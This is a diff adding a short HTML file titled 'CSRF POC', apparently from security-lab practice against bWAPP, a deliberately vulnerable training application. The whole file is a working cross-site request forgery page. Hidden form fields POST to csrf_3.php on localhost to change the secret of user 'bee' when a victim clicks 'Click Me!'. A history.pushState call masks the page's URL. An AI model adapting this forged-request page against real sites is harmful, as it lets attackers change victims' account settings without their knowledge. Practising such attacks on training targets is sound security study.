@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+	<h1>CSRF POC</h1>
+	<script>history.pushState('','','/')</script>
+	<form action="http://localhost/bWAPP/csrf_3.php" method="POST">
+		<input type="hidden" name="secret" value="admin">
+		<input type="hidden" name="login" value="bee">
+		<input type="hidden" name="action" value="change">
+		<input type="submit" value="Click Me!">
+	</form>
+</html>
